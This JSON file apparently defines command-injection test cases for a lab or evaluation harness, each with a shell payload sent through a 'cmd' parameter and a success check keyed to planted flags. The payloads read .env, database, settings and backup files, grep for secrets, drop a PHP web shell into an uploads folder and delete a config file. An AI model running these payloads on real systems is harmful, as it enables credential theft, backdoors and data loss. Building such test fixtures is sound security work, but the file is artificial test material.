[
  {"id": "env-file",        "payload": "cat /srv/app/.env",
   "tier": "P0", "severity": "L3", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "flag{db_master_pass_a3c5}"}},
  {"id": "db-config",        "payload": "cat /srv/app/config/database.cnf",
   "tier": "P1", "severity": "L3", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "flag{db_config_root_b7d3}"}},
  {"id": "app-settings",    "payload": "cat /srv/app/config/settings.json",
   "tier": "P1", "severity": "L2", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "flag{jwt_token_signing_1a6c}"}},
  {"id": "backup-sql",      "payload": "cat /srv/backups/user_export_20260715.sql",
   "tier": "P2", "severity": "L3", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "flag{admin_api_token_5c7a}"}},
  {"id": "server-config",   "payload": "cat /srv/data/server_config.yml",
   "tier": "P2", "severity": "L2", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "flag{ssh_deploy_passphrase_7f4a}"}},
  {"id": "cred-grep",       "payload": "grep -r 'flag{' /srv/ 2>/dev/null",
   "tier": "CMD", "severity": "L1", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "flag{"}},
  {"id": "whoami",          "payload": "whoami",
   "tier": "CMD", "severity": "L1", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "www-data"}},
  {"id": "id",              "payload": "id",
   "tier": "CMD", "severity": "L1", "url_param": "cmd",
   "success_on": {"check": "response_contains", "value": "uid="}},
  {"id": "webshell-drop",   "payload": "echo '<?php system($_GET[c]);' > /var/www/html/uploads/s.php",
   "tier": "P1", "severity": "L3", "url_param": "cmd",
   "success_on": {"check": "file_exists", "value": true, "path": "/var/www/html/uploads/s.php"},
   "pre_setup": {"action": "file_delete", "path": "/var/www/html/uploads/s.php"}},
  {"id": "data-wipe",       "payload": "rm /srv/data/server_config.yml",
   "tier": "P2", "severity": "L3", "url_param": "cmd",
   "success_on": {"check": "file_missing", "value": true, "path": "/srv/data/server_config.yml"},
   "pre_setup": {"action": "file_create", "path": "/srv/data/server_config.yml", "content": "x"}}
]
